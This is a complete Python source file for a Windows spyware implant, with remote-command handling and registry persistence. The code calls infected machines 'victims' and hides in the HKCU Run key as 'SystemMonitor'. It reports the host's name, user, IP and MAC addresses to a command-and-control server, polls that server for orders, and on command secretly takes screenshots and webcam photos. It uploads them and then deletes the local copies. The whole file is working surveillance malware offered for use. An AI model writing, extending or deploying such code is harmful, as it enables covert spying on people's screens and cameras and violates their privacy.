import winreg as reg
import os
import time
import sys
import socket
import uuid
import requests
import json
from platform import uname
from getpass import getuser
from datetime import datetime

# ==================== CONFIGURATION ====================
SERVER_URL = "http://localhost:3001/api"  # Update with your server URL
CHECK_INTERVAL = 5                    # 1 minute between server checks
PROCESSING_GAP = 2                     # 2-second gap between commands
LOG_FILE = os.path.join(os.path.expanduser('~'), 'Documents', 'log.txt')
ID_FILE = os.path.join(os.path.expanduser('~'), 'Documents', 'id.txt')
INFO_FILE = os.path.join(os.path.expanduser('~'), 'Documents', 'Info')

# ===================== LOGGING SYSTEM =====================
def log_error(message):
    """Log errors with timestamp to log.txt"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] ERROR: {message}\n"
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Critical logging failure: {str(e)}", file=sys.stderr)

# ===================== PERSISTENCE =====================
def get_exe_path():
    return os.path.realpath(sys.argv[0])

def add_to_registry():
    """Add executable to startup registry"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, "SystemMonitor", 0, reg.REG_SZ, get_exe_path())
        reg.CloseKey(key)
    except Exception as e:
        log_error(f"Registry persistence failed: {str(e)}")

def check_registry():
    """Verify registry persistence"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_READ)
        value, _ = reg.QueryValueEx(key, "SystemMonitor")
        reg.CloseKey(key)
        return value == get_exe_path()
    except Exception:
        return False

# ================== SYSTEM INFORMATION ==================
def get_system_info():
    """Collect comprehensive system information"""
    info = {
        "name": uname().node,
        "username": getuser(),
        "localIP": "127.0.0.1",
        "publicIP": "Unknown",
        "macAddress": "00:00:00:00:00:00",
        "description": f"Windows {uname().version} {uname().machine}",
        "img": "base64_placeholder"
    }

    try:
        info['publicIP'] = requests.get('https://api.ipify.org', timeout=5).text
    except Exception as e:
        log_error(f"Public IP fetch failed: {str(e)}")

    try:
        mac = uuid.getnode()
        info['macAddress'] = ':'.join([f"{(mac >> elements) & 0xff:02x}" 
                                     for elements in range(0,8*6,8)][::-1])
    except Exception as e:
        log_error(f"MAC address fetch failed: {str(e)}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('10.255.255.255', 1))
        info['localIP'] = s.getsockname()[0]
        s.close()
    except Exception as e:
        log_error(f"Local IP detection failed: {str(e)}")

    return info

def save_system_info(info):
    """Save system information locally"""
    try:
        with open(INFO_FILE, 'w', encoding='utf-8') as f:
            json.dump(info, f, indent=2)
    except Exception as e:
        log_error(f"Info file save failed: {str(e)}")

# ===================== ID MANAGEMENT =====================
def get_victim_id():
    """Retrieve stored victim ID"""
    try:
        with open(ID_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except Exception:
        return None

def save_victim_id(victim_id):
    """Save victim ID to file"""
    try:
        with open(ID_FILE, 'w', encoding='utf-8') as f:
            f.write(victim_id)
    except Exception as e:
        log_error(f"ID file save failed: {str(e)}")

def handle_invalid_id():
    """Handle invalid ID scenario by force re-registering"""
    try:
        if os.path.exists(ID_FILE):
            os.remove(ID_FILE)
    except Exception as e:
        log_error(f"ID file removal failed: {str(e)}")

    system_info = get_system_info()
    new_id = send_registration(system_info)
    if new_id:
        save_victim_id(new_id)
        save_system_info(system_info)
        return new_id
    return None

# ================== SERVER COMMUNICATION ==================
def send_registration(info):
    """Register new victim with server"""
    try:
        response = requests.post(
            f"{SERVER_URL}/mw/registerVictim",
            json=info,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        if response.status_code == 201:
            return response.json().get("id")
        log_error(f"Registration failed: HTTP {response.status_code}")
    except Exception as e:
        log_error(f"Registration request failed: {str(e)}")
    return None

def send_update(info, victim_id):
    """Update existing victim info"""
    try:
        response = requests.post(
            f"{SERVER_URL}/mw/updateVictim/{victim_id}",
            json=info,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        if response.status_code == 201:
            return True
        return False
    except Exception as e:
        log_error(f"Update request failed: {str(e)}")
        return False

def check_requests(victim_id):
    """Check server for pending commands"""
    try:
        response = requests.get(
            f"{SERVER_URL}/mw/requests/{victim_id}",
            timeout=10
        )
        if response.status_code == 200:
            return response.json()
        if response.status_code == 404:
            return None
        return {}
    except Exception as e:
        log_error(f"Request check failed: {str(e)}")
        return {}

def upload_file(file_path, request_id):
    """Upload file to fulfillment endpoint"""
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(
                f"{SERVER_URL}/fulfill/{request_id}",
                files={'img': f},
                timeout=30
            )
        return response.status_code == 200
    except Exception as e:
        log_error(f"Upload failed: {str(e)}")
        return False

def mark_fulfilled(request_id):
    """Notify server of completed command"""
    try:
        response = requests.post(
            f"{SERVER_URL}/mw/requests/fulfilled",
            json={"requestId": request_id},
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        log_error(f"Fulfillment confirmation failed: {str(e)}")
        return False

# ================== COMMAND PROCESSING ==================
def process_requests(requests_dict):
    """Process requests with proper file cleanup"""
    for req in requests_dict:
        req_type = req['demand']
        request_id = req['_id']
        file_path = None
        try:
            if req_type == "screenshot":
                file_path = take_screenshot(request_id)
            elif req_type == "camera":
                file_path = capture_camera(request_id)
            else:
                log_error(f"Unknown request type: {req_type}")
                continue

            if file_path and os.path.exists(file_path):
                # Attempt file upload
                if upload_file(file_path, request_id):
                    # Confirm fulfillment with server
                    if mark_fulfilled(request_id):
                        log_error(f"Successfully fulfilled {req_type} request {request_id}")
                        cleanup_file(file_path)
                    else:
                        log_error(f"Fulfillment confirmation failed for {request_id}")
                else:
                    log_error(f"Upload failed for {req_type} request {request_id}")

        except Exception as e:
            log_error(f"Request processing failed: {str(e)}")
            if file_path and os.path.exists(file_path):
                cleanup_file(file_path)

def take_screenshot(request_id):
    """Capture and save screenshot to Pictures/Screenshots folder"""
    try:
        import pyautogui
        # Create screenshot directory if not exists
        screenshots_dir = os.path.join(os.path.expanduser('~'), 'Pictures', 'Screenshots')
        os.makedirs(screenshots_dir, exist_ok=True)
        
        # Generate filename with request ID
        file_name = f"screenshot_{request_id}.png"
        file_path = os.path.join(screenshots_dir, file_name)
        
        # Capture and save screenshot
        pyautogui.screenshot().save(file_path)
        return file_path
        
    except Exception as e:
        log_error(f"Screenshot capture failed: {str(e)}")
        raise

def capture_camera(request_id):
    """Capture camera image"""
    try:
        import cv2
        file_name = f"camera_{request_id}.jpg"
        file_path = os.path.join(os.getcwd(), file_name)
        
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite(file_path, frame)
        else:
            raise Exception("No frame captured")
            
        return file_path
    except Exception as e:
        log_error(f"Camera capture failed: {str(e)}")
        raise

def cleanup_file(file_path):
    """Delete file after successful fulfillment"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            log_error(f"Cleaned up file: {file_path}")
    except Exception as e:
        log_error(f"File cleanup failed: {str(e)}")
        
# ===================== MAIN LOOP =====================
def main_loop():
    """Main service loop"""
    while True:
        start_time = time.time()
        victim_id = get_victim_id()
        
        if not victim_id:
            victim_id = handle_invalid_id()
            if not victim_id:
                time.sleep(CHECK_INTERVAL)
                continue

        # Update system info
        system_info = get_system_info()
        if not send_update(system_info, victim_id):
            victim_id = handle_invalid_id()
            if not victim_id:
                time.sleep(CHECK_INTERVAL)
                continue

        # Check for commands
        requests = check_requests(victim_id)
        if requests is None:  # Invalid ID scenario
            victim_id = handle_invalid_id()
            continue
        
        process_requests(requests)
        
        # Maintain check interval
        elapsed = time.time() - start_time
        sleep_time = max(CHECK_INTERVAL - elapsed, 0)
        time.sleep(sleep_time)

# ===================== INITIALIZATION =====================
if __name__ == "__main__":
    # Establish persistence
    if not check_registry():
        try:
            add_to_registry()
        except Exception as e:
            log_error(f"Initial persistence setup failed: {str(e)}")

    # Initial registration if needed
    if not get_victim_id():
        handle_invalid_id()

    # Start main service loop
    try:
        main_loop()
    except KeyboardInterrupt:
        log_error("Service terminated by user")
    except Exception as e:
        log_error(f"Critical runtime error: {str(e)}")